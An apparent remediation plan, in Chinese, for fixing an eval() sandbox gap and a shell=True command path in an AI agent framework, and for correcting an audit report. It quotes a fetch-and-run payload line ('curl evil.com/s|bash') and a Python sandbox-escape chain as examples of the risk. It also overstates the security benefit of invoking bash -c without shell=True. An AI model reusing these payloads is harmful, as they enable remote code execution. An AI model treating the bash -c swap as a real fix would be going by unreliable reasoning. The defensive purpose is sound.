---
name: audit-v2-remaining-fixes
overview: 修复审计报告 v2 中 2 处遗留风险：workflow engine 的 eval() 未收窄、agent_tools 的 shell=True 根因未消除，并修正报告中不准确的状态标注。
todos:
  - id: fix-engine-eval
    content: 用 AST 安全求值替换 embodiment/workflow/engine.py:314 的 eval()，仅允许布尔/比较/逻辑节点
    status: completed
  - id: fix-shell-true
    content: 将 agent_tools.py 的 shell=True 改为 [bash, -c, command] + 长度校验
    status: completed
  - id: fix-report-text
    content: "修正 audit_report_20260407.md 中 Finding #2/#3 的状态标注与描述"
    status: completed
isProject: false
---

# 审计报告 v2 遗留风险修复

## 核验结论

报告 6 项 Finding 中有 2 处需要补充修复：

- **Finding #3（eval）**：报告标注 "Fixed"，但 `embodiment/workflow/engine.py:314` 的 `eval(condition, eval_context)` **未修**。虽然 `__builtins__` 设为空字典，但 `context_dict` 的 `metadata` 可污染上下文，且 `eval` 在 CPython 下即使无 `__builtins__` 也可通过 `().__class__.__bases__[0].__subclasses__()` 链越狱。
- **Finding #2（shell=True）**：报告标注 "Mitigated"，`pre_tool_guard` 确实扩面了，但 `agent_tools.py:1122-1132` 的 `shell=True` 根因未消除。正则守卫只覆盖有限危险模式（`rm -rf`、`DROP TABLE` 等），无法防御通用注入（如 `curl evil.com/s|bash`、反弹 shell 等）。

此外报告文本有 1 处小误差：矩阵写 calculator 改为 `ast.literal_eval`，实际实现是自定义 AST 算术求值器。

---

## 修复方案

### 1. 修复 workflow engine eval() — P1

**文件**：[`agenticx/embodiment/workflow/engine.py`](agenticx/embodiment/workflow/engine.py)

**当前代码**（285-317 行）：

```python
eval_context = {
    "__builtins__": {},
    "result": True,
    "True": True, "False": False,
    **context_dict.get("metadata", {}),
    **context_dict
}
return bool(eval(condition, eval_context))
```

**方案**：用与 calculator 同款的 AST 安全求值替换 `eval()`。工作流条件只需支持：
- 布尔字面量（`True` / `False`）
- 比较表达式（`result == "success"`、`step_count > 3`）
- 逻辑连接（`and` / `or` / `not`）
- 从 context 中按名称取值

实现一个 `_safe_condition_eval(condition: str, context: dict) -> bool` 函数，仅 `ast.parse(mode="eval")` 后递归遍历允许的节点类型（`Constant`、`Name`、`Compare`、`BoolOp`、`UnaryOp(Not)`），拒绝 `Call`、`Attribute`、`Subscript` 等。

### 2. 消除 agent_tools shell=True — P1

**文件**：[`agenticx/cli/agent_tools.py`](agenticx/cli/agent_tools.py) 约 1112-1132 行

**当前问题**：当命令含 `;`、`&&`、`|`、`$(`、重定向等时直接 `subprocess.run(command, shell=True, executable="/bin/bash")`。

**方案**：将 `shell=True` 路径替换为 `subprocess.run(["/bin/bash", "-c", command], shell=False)`。效果上 bash 仍会解释元字符（这是 agent runtime 的需求——LLM 确实需要管道、重定向等），但 Python 层不再做 shell 展开，避免 Python `subprocess` 的 shell 注入面（如空格/引号歧义）。同时将 `command` 做长度上限校验（如 64KB），避免极端输入。

这是一个**最小改动**：不改变功能行为（bash 仍解释命令），但消除 Python `shell=True` 的额外风险面。

### 3. 修正审计报告文本 — P2

**文件**：[`agenticx/audit_report_20260407.md`](agenticx/audit_report_20260407.md)

- Finding #3 矩阵：将 "Fixed" 改为描述实际状态（2/3 已修，workflow engine 待修）
- Finding #2 矩阵：补充说明根因修复方案（`shell=True` → `[bash, -c, ...]`）
- Finding #3 Remediation：calculator 描述改为 "AST-based safe arithmetic evaluator"（非 `ast.literal_eval`）
